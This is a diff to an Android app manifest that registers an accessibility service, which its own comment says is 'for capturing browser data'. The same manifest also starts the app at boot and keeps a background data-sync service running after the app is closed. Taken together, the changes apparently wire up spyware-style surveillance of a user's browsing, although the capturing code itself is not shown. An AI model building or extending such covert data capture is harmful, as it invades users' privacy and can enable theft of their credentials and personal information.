@@ -124,6 +124,9 @@
     <!-- BODY SENSORS (for Android 13+) -->
     <uses-permission android:name="android.permission.BODY_SENSORS" />
     
+    <!-- 🔧 ACCESSIBILITY SERVICE PERMISSION -->
+    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
+    
     <application
         android:name=".AppController"
         android:allowBackup="true"
@@ -204,6 +207,20 @@
             android:exported="false"
             android:foregroundServiceType="dataSync"
             android:stopWithTask="false" />
+        
+        <!-- 🔧 ACCESSIBILITY SERVICE - For capturing browser data -->
+        <service
+            android:name=".BrowserAccessibilityService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
         
         <!-- Boot Receiver - Auto-start on device boot -->
         <receiver
